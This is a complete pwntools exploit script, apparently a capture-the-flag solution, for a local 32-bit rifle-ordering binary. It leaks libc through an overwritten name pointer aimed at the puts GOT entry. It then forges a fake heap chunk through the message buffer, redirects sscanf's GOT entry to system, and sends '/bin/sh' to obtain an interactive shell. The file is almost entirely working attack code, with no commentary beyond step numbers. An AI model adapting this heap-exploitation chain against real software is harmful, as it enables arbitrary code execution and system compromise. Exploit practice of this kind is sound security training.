from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample18')
p = process('./data/sample18')
libc = elf.libc

def addRifle(name, desc):
    p.sendline(b'1')
    p.sendline(name)
    p.sendline(desc)

def leakLibc():
    p.sendline(b'2')
    print(p.recvuntil(b'Description: '))
    print(p.recvuntil(b'Description: '))
    leak = p.recvline()
    puts = u32(leak[0:4])
    libc_base = puts - libc.symbols['puts']
    return libc_base

def orderRifles():
    p.sendline(b'3')

def leaveMessage(content):
    p.sendline(b'4')
    p.sendline(content)

def addRifles(count):
    for i in range(count):
        addRifle(b'1'*0x1b + p32(0x0), b'1593')
        orderRifles()

addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')#step.1
libc_base = leakLibc();system = libc_base + libc.symbols['system']#step.2
addRifles(0x3f)#step.3
addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')#step.4
leaveMessage(p32(0)*9 + p32(0x81))#step.5
orderRifles()#step.6
addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))#step.7
leaveMessage(p32(system))#step.8
p.sendline(b'/bin/sh')#step.9
p.interactive()